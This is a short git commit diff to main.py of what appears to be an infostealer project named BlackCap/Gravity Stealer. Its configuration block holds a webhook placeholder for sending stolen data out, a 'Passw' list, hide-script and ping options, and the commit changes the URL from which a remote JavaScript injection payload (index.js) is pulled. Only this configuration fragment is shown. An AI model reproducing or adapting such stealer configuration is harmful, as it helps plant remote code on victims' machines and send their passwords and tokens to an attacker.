cab8dc2767e30a9bbf1b0e9f0dd1bd9e9172bccc
MohxKd <120721922+MohxKd@users.noreply.github.com>
2022-12-25 15:43:06 +0100

    Update main.py

--- main.py
+++ main.py
@@ -53,7 +53,7 @@ Passw = [];
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
-    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    'blackcap_inject_url': "https://raw.githubusercontent.com/MohxKd/Gravity-Stealer/main/index.js",
     'hide': '%_hide_script%',
     'ping': '%ping_enabled%',
     'pingtype': '%ping_type%',
